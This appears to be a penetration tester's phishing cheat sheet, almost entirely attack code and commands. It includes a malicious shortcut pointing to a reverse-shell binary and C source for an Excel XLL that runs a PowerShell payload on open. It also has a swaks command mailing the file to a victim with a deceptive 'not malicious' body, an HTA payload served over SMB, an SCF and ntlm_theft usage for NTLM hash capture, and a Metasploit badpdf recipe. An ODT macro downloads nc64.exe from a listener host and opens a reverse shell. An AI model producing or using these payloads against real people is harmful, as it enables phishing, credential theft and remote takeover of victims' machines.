---
title: "Phishing"
date: 2024-6-26
tags: ["phishing", "email", "xll", "excel", "hta", "shortcut", "Windows", "odt", "libre", "vba", "ntlm_theft"]
---

---
### Create malicious .lnk

```powershell
$obj = New-Object -ComObject WScript.Shell
```

```powershell
$link = $obj.CreateShortcut("C:\Windows\Tasks\Calculator.lnk")
```

```powershell
$link.TargetPath = "C:\windows\tasks\rev.exe"
```

```powershell
$link.Save()
```

<br>

---

### Phishing with XLL (Excel)

[revshells.com](https://www.revshells.com/)

#### shell.c

```c
#include <windows.h>

__declspec(dllexport) void __cdecl xlAutoOpen(void); 

void __cdecl xlAutoOpen() {
    // Triggers when Excel opens
    WinExec("<PowerShell #3 Base64 Payload>", 1); // Replace your payload
}

BOOL APIENTRY DllMain( HMODULE hModule,
                    DWORD  ul_reason_for_call,
                    LPVOID lpReserved
                    )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

#### Compile shell.c using Linux

```bash
x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll shell.c -luser32
```

#### Send email with the malicious xll file

```bash
swaks --to "victim@victim.com" --from "attacker@attacker.com" --server "victim.com" --header "This is not a malicious file" --body "This is not a malicious file" --attach '@shell.xll'
```

<br>

---

### Phishing with Shortcut

#### Start a Local SMB Server

```bash
# In our local Linux machine
impacket-smbserver -smb2support share .
```

#### Create a Malicious hta File in local Linux SMB share

[revshells.com](https://www.revshells.com/)

```html
<html>
    <head>
        <HTA:APPLICATION ID="shell">
        <script language="javascript">
            var c = "<PowerShell #3 Base64 Payload>";  
            new ActiveXObject('WScript.Shell').Run(c, 0, true); 
        </script>
    </head>
    <body>
        <script>self.close();</script>
    </body>
</html>
```

#### Create a shortcut file in target Windows

```powershell
# In target Windows machine (powershell)
$url = "file://10.10.14.10/share/shell.hta"
```

```powershell
$shortcutPath = "C:\Windows\Tasks\shell.url"
```

```powershell
$shortcutContent = "[InternetShortcut]`r`nURL=$url"
```

```powershell
Set-Content -Path $shortcutPath -Value $shortcutContent
```

<br>

---

### Phishing with Shortcut (With SMB Share Write Permission)

If you found any interaction from target to smb share (e.g. cronjob)

#### Start a Local Responder Listener

```bash
# In our local Linux machine
sudo responder -I tun0
```

#### Create a malicious shortcut

```evil.scf
[Shell]
Command=2

IconFile=\\10.10.14.10\icon
```

#### Upload the malicious shortcut

```bash
# In our local Linux machine
smbclient -N \\\\10.10.11.10\\share\\
```

```bash
mput evil.scf
```

<br>

---

### Phishing with odt (Open Office format)

```bash
+------------------------------------------------------+
|1. "Tools" > "Macros" > "Organize Macros" > "Basic..."|
|2. "Untitled 1" > "Standard" > "New"                  |
|3. "Paste the code below"                             |
+------------------------------------------------------+
```

<br>

```bash
Sub OnLoad
    shell("cmd /c certutil -urlcache -split -f http://10.10.14.10/nc64.exe C:\programdata\nc64.exe && C:\programdata\nc64.exe -e cmd 10.10.14.10 443")
End Sub
```

<br>

```bash
+---------------------------------------------------------+
|4. "Tools" > "Organize Macros" > "Basic..." > "Assign..."|
|5. "Events" > "Open Document" > "OK"                     |
|6. "SAVE"                                                |
+---------------------------------------------------------+
```

<br>

---

### Phishing with multiple file types

[ntlm_theft](https://github.com/Greenwolf/ntlm_theft)


```bash
python3 ntlm_theft.py -g all -s 10.10.14.10 -f test
```

<br>

---

### Create malicious pdf file

```bash
msfconsole -q
```

```bash
search badpdf
```

```bash
set filename evil.pdf
```

```bash
set lhost 10.10.14.10
```

```bash
exploit
```

<br>